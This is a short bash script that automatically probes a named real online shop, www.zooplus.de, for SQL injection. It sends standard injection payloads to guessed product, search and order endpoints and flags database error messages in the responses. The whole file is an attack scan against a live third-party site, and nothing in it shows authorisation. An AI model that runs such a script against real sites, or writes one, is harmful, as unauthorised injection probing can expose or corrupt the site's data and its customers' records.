#!/bin/bash

# Quick SQL Injection Testing

TARGET="www.zooplus.de"
OUTPUT="reports/sqli_test.txt"

echo "================================================================================"
echo "SQL INJECTION TESTING"
echo "================================================================================"

echo "[*] Testing SQL injection..." | tee "$OUTPUT"

# SQL payloads
SQL_PAYLOADS=(
    "'"
    "' OR '1'='1"
    "' OR 1=1--"
    "\" OR \"1\"=\"1"
    "' UNION SELECT NULL--"
    "admin'--"
    "1' AND 1=2 UNION SELECT NULL, NULL--"
)

# Common SQL injection points
ENDPOINTS=(
    "/?id="
    "/product?id="
    "/search?id="
    "/api/product?id="
    "/api/order?id="
)

# SQL error strings to detect
SQL_ERRORS=(
    "sql syntax"
    "mysql"
    "postgresql"
    "ora-"
    "sqlite"
    "syntax error"
    "unexpected end of SQL"
    "warning.*mysql"
    "valid MySQL result"
    "PostgreSQL.*ERROR"
    "Microsoft SQL Native Client error"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "" | tee -a "$OUTPUT"
    echo "[*] Testing endpoint: $endpoint" | tee -a "$OUTPUT"
    
    for payload in "${SQL_PAYLOADS[@]}"; do
        URL="https://$TARGET${endpoint}$(echo $payload | jq -sRr @uri)"
        
        RESPONSE=$(curl -s "$URL")
        
        # Check for SQL errors
        for error in "${SQL_ERRORS[@]}"; do
            if echo "$RESPONSE" | grep -iE "$error" > /dev/null; then
                echo "  [!!!] SQL INJECTION FOUND!" | tee -a "$OUTPUT"
                echo "  Payload: $payload" | tee -a "$OUTPUT"
                echo "  Error: $error" | tee -a "$OUTPUT"
                echo "  URL: $URL" | tee -a "$OUTPUT"
                break 2
            fi
        done
    done
done

echo "" | tee -a "$OUTPUT"
echo "[+] SQL injection testing complete. Results in: $OUTPUT"

